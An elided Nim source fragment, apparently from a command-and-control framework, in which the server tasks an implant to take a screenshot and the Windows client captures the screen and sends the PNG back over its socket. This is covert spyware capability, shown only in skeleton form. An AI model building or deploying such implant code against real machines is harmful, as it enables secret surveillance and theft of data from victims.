...
when defined(client):
  import net, winim, pixie, base64
  import ../client/communication

when defined(server):
  proc sendTask*(client: C2Client): Future[Task] {.async.} =
    return await client.sendClientTask("screenshot")
...
when defined(client):
  ...
  proc executeTask*(socket: net.Socket, taskId: int) =
    ...
    socket.sendOutput(taskId, "SCREENSHOT", image.encodeImage(PngFormat), "")